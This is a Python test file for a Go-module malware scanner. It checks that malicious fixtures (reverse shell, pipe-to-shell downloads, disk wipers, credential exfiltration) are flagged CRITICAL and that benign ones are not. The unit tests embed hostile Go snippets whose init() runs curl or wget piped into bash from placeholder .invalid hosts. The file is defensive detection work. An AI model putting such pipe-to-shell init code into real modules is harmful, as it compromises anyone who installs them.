"""Canary + control tests:  python3 -m unittest discover -s tests

Every mal-* fixture must reach its expected level AND fire its expected pattern; every ok-*
fixture (patterns popular modules really use) must stay below MEDIUM. The fixtures are inert:
hosts are reserved (.invalid / TEST-NET), credentials are obvious canaries, and nothing here is
ever compiled or executed.
"""
import io
import os
import sys
import unittest
import zipfile

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.dirname(HERE))
import gomod_audit as ga  # noqa: E402

FIX = os.path.join(HERE, "fixtures")
EXPECT = {
    "mal-boltdb-typosquat": ("CRITICAL", "reverse_shell"),       # boltdb-go: C2 remote shell from init()
    "mal-stringarray-wget": ("CRITICAL", "download_execute"),    # 2025 wave: string-array wget | bash
    "mal-concat-darwin": ("CRITICAL", "download_execute"),       # 2025 wave: fragment concat, darwin-only
    "mal-disk-wiper": ("CRITICAL", "destructive"),               # 2025 wipers: decoded dd of=/dev/sda
    "mal-init-exfil": ("CRITICAL", "credential_exfil"),          # init() env + ssh-key exfil
    "mal-gogenerate": ("CRITICAL", "download_execute"),          # //go:generate pipe-to-shell
    "mal-cgo-constructor": ("CRITICAL", "cgo_constructor_exec"), # C constructor in cgo preamble
    "mal-cred-webhook": ("CRITICAL", "credential_exfil"),        # ~/.aws/credentials -> webhook.site
    "mal-init-dropper": ("CRITICAL", "dropper"),                 # download + chmod + exec from init()
}


def scan_fixture(name):
    return ga.scan_module(ga.files_from_dir(os.path.join(FIX, name)), name)


class Canaries(unittest.TestCase):
    def test_every_malicious_fixture_fires(self):
        for name, (want, fid) in sorted(EXPECT.items()):
            with self.subTest(name=name):
                r = scan_fixture(name)
                ids = {f["id"] for f in r["findings"]}
                self.assertGreaterEqual(ga.SEV_ORDER[r["risk_level"]], ga.SEV_ORDER[want], (name, r["summary"]))
                self.assertIn(fid, ids, (name, sorted(ids)))

    def test_all_mal_fixtures_listed(self):
        mal = {n for n in os.listdir(FIX) if n.startswith("mal-")}
        self.assertEqual(mal, set(EXPECT))

    def test_import_time_escalation(self):
        r = scan_fixture("mal-stringarray-wget")
        obf = [f for f in r["findings"] if f["id"] == "obfuscated_exec"]
        self.assertTrue(obf and obf[0]["severity"] == "CRITICAL" and obf[0]["context_kind"] == "import")

    def test_build_constraint_reported(self):
        r = scan_fixture("mal-concat-darwin")
        self.assertTrue(any(f.get("build_constraint") == "darwin" for f in r["findings"]))

    def test_decoded_array_payload(self):
        r = scan_fixture("mal-stringarray-wget")
        self.assertTrue(any("decoded from array" in f["description"] for f in r["findings"]))


class Controls(unittest.TestCase):
    def test_benign_fixtures_quiet(self):
        for name in sorted(n for n in os.listdir(FIX) if n.startswith("ok-")):
            with self.subTest(name=name):
                r = scan_fixture(name)
                self.assertLess(ga.SEV_ORDER[r["risk_level"]], ga.SEV_ORDER["MEDIUM"], (name, r["findings"]))

    def test_testdata_and_tests_demoted(self):
        r = scan_fixture("ok-testdata")
        self.assertEqual(r["risk_level"], "SAFE")
        self.assertTrue(any("testdata" in f["description"] for f in r["info"]))


class Units(unittest.TestCase):
    def test_text_pipe_to_shell(self):
        r = ga.scan('func init() { exec.Command("sh", "-c", "curl https://x.invalid/a | bash").Run() }')
        self.assertEqual(r["risk_level"], "CRITICAL")

    def test_text_benign(self):
        self.assertEqual(ga.scan('func F() string { return "hello" }')["risk_level"], "SAFE")

    def test_escape_path(self):
        self.assertEqual(ga.escape_path("github.com/BurntSushi/toml"), "github.com/!burnt!sushi/toml")

    def test_split_spec(self):
        self.assertEqual(ga.split_spec("golang.org/x/net@v0.1.0"), ("golang.org/x/net", "v0.1.0"))
        self.assertEqual(ga.split_spec("golang.org/x/net"), ("golang.org/x/net", "latest"))

    def test_go_unquote(self):
        self.assertEqual(ga.go_unquote(r'"a\x41\né"'), "aA\né")
        self.assertEqual(ga.go_unquote("`raw\\n`"), "raw\\n")

    def test_resolver_index_reassembly(self):
        gf = ga.GoFile("x.go", 'package x\nfunc f() { a := []string{"h", "s", "/"}\n b := a[2] + a[1] + a[0]\n exec.Command(b) }\n')
        self.assertEqual(ga.Resolver(gf).env.get("b"), "/sh")

    def test_comment_is_not_code(self):
        self.assertEqual(ga.scan('// curl https://x.invalid | sh\nfunc f() {}', import_time=False)["risk_level"], "SAFE")

    def test_gomod_and_gosum_parsing(self):
        import tempfile
        d = tempfile.mkdtemp()
        gm = os.path.join(d, "go.mod")
        with open(gm, "w") as f:
            f.write("module m\n\nrequire golang.org/x/net v0.1.0\nrequire (\n\tgithub.com/a/b v1.2.3 // indirect\n)\n")
        self.assertEqual(ga.gomod_specs(gm), ["github.com/a/b@v1.2.3", "golang.org/x/net@v0.1.0"])
        gs = os.path.join(d, "go.sum")
        with open(gs, "w") as f:
            f.write("github.com/a/b v1.2.3 h1:x=\ngithub.com/a/b v1.2.3/go.mod h1:y=\n")
        self.assertEqual(ga.gosum_specs(gs), ["github.com/a/b@v1.2.3"])

    def test_module_zip_layout(self):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("example.invalid/m@v1.0.0/go.mod", "module example.invalid/m\n")
            z.writestr("example.invalid/m@v1.0.0/a.go",
                       'package m\nimport "os/exec"\nfunc init() { exec.Command("sh", "-c", "wget -O - https://x.invalid | /bin/bash").Run() }\n')
        files = ga.files_from_zip(buf.getvalue())
        self.assertEqual(sorted(files), ["a.go", "go.mod"])
        self.assertEqual(ga.scan_module(files)["risk_level"], "CRITICAL")


if __name__ == "__main__":
    unittest.main()
